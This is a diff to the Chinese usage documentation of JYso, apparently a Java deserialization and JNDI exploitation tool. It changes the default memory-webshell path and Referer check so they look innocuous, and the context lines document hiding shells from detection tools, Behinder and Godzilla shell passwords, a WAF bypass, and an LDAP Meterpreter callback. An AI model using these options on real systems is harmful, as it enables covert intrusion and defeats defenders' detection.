@@ -207,9 +207,9 @@ ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/msf/[msf_ip]/[msf_port]
 - o：使用反射绕过
 - w：Windows下使用Agent写入
 - l：Linux下使用Agent写入
-- u：内存马绑定的路径,default [/QI4L]
+- u：内存马绑定的路径,default [/sysinfo]
 - pw：内存马的密码,default [p@ssw0rd]
-- r：内存马 Referer check,default [https://QI4L.cn/]
+- r：内存马 Referer check,default [https://www.baidu.com/]
 - h：通过将文件写入$JAVA_HOME来隐藏内存shell，目前只支持 SpringControllerMS
 - ht：隐藏内存外壳，输入1:write /jre/lib/charsets.jar 2:write /jre/classes/
 
@@ -681,7 +681,7 @@ usage: JYso-[version].jar [-ch <arg>] [-dcfp <arg>] [-dl <arg>] [-dt <arg>] [-f 
  -h,--hide-mem-shell                         对检测工具隐藏内存外壳（类型2仅支持SpringControllerMS）
  -hk,--header-key <arg>                      MemoryShell 标头检查，请求标头密钥，默认 [Referer]
  -ht,--hide-type <arg>                       隐藏内存shell，输入1：write /jre/lib/charsets.jar 2：write /jre/classes/
- -hv,--header-value <arg>                    MemoryShell 标头检查,请求标头值,默认 [https://QI4L.cn/]
+ -hv,--header-value <arg>                    MemoryShell 标头检查,请求标头值,默认 [https://www.baidu.com/]
  -i,--inherit                                是否让payload继承AbstractTranslet（低版本的JDK如1.6应该继承）
  -mcl,--mozilla-class-loader                 在 TransformerUtil 中使用 org.mozilla.javascript.DefiningClassLoader
  -n,--gen-mem-shell-name <arg>               内存外壳类文件名
@@ -690,7 +690,7 @@ usage: JYso-[version].jar [-ch <arg>] [-dcfp <arg>] [-dl <arg>] [-dt <arg>] [-f 
  -p,--parameters <arg>                       Gadget parameters
  -pw,--password <arg>                        Behinder 或 Godzilla 密码，默认 [p@ssw0rd]
  -rh,--rhino                                 使用Rhino Engine 把内存马代码转换为JS
- -u,--url <arg>                              MemoryShell绑定url模式，默认[/QI4L]
+ -u,--url <arg>                              MemoryShell绑定url模式，默认[/sysinfo]
  -utf,--utf8-Overlong-Encoding               UTF-8 Overlong Encoding Bypass waf
  -yso,--ysoserial <arg>                      Java deserialization
 
